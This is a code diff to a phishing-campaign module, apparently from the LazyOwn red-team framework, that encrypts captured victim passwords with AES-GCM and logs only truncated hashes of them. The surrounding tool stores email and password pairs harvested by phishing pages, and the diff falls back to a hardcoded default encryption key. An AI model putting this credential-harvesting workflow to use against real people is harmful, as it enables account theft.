@@ -31,7 +31,10 @@ Usage:
 
 from __future__ import annotations
 
+import base64
+import hashlib
 import json
+import os
 import random
 import smtplib
 import ssl
@@ -47,6 +50,70 @@ from typing import Any
 BASE_DIR = Path(__file__).resolve().parent.parent
 SESSIONS_DIR = BASE_DIR / "sessions"
 PAYLOAD_PATH = BASE_DIR / "payload.json"
+
+_CREDENTIAL_SALT = b"lazyown-phishing-v1"
+_CREDENTIAL_HASH_LENGTH = 16
+
+
+def _derive_credential_key() -> bytes:
+    """Derive an AES key from the machine-local secret for credential encryption.
+
+    Returns:
+        32-byte key for AES-256-GCM encryption.
+    """
+    from core.crypto import derive_key, generate_salt
+    secret = os.environ.get("LAZYOWN_SECRET_KEY", "")
+    if not secret:
+        secret_file = SESSIONS_DIR / ".secret_key"
+        if secret_file.exists():
+            secret = secret_file.read_text().strip()
+    if not secret:
+        secret = "lazyown-default-credential-encryption-key"
+    salt = hashlib.sha256(_CREDENTIAL_SALT).digest()
+    return derive_key(secret, salt)
+
+
+def _encrypt_credential(plaintext: str) -> str:
+    """Encrypt a credential string using AES-256-GCM.
+
+    Args:
+        plaintext: The plaintext credential.
+
+    Returns:
+        Base64-encoded encrypted payload (nonce || ciphertext || tag).
+    """
+    from core.crypto import AESencrypt
+    key = _derive_credential_key()
+    ciphertext, _ = AESencrypt(plaintext.encode("utf-8"), key)
+    return base64.urlsafe_b64encode(ciphertext).decode("ascii")
+
+
+def _decrypt_credential(encrypted_b64: str) -> str:
+    """Decrypt a credential string encrypted by ``_encrypt_credential``.
+
+    Args:
+        encrypted_b64: Base64-encoded encrypted payload.
+
+    Returns:
+        Decrypted plaintext string.
+    """
+    from core.crypto import AESdecrypt
+    key = _derive_credential_key()
+    ciphertext = base64.urlsafe_b64decode(encrypted_b64)
+    return AESdecrypt(ciphertext, key).decode("utf-8")
+
+
+def _hash_credential_for_log(plaintext: str) -> str:
+    """Return a truncated SHA-256 hash suitable for audit logs.
+
+    Args:
+        plaintext: The plaintext credential.
+
+    Returns:
+        Truncated hex digest for logging without exposing the credential.
+    """
+    digest = hashlib.sha256(_CREDENTIAL_SALT + plaintext.encode("utf-8")).hexdigest()
+    return digest[:_CREDENTIAL_HASH_LENGTH]
 
 
 @dataclass
@@ -537,7 +604,7 @@ acknowledge these changes.</p>
                 creds = []
         creds.append({
             "email": email,
-            "password": password,
+            "password": _encrypt_credential(password),
             "timestamp": time.time(),
         })
         creds_file.write_text(json.dumps(creds, indent=2))
@@ -545,7 +612,7 @@ acknowledge these changes.</p>
         all_creds = SESSIONS_DIR / "phishing_credentials.txt"
         all_creds.parent.mkdir(parents=True, exist_ok=True)
         with all_creds.open("a") as f:
-            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {email} | {password} | {campaign_id}\n")
+            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {email} | {_hash_credential_for_log(password)} | {campaign_id}\n")
 
     # ------------------------------------------------------------------
     # Internal
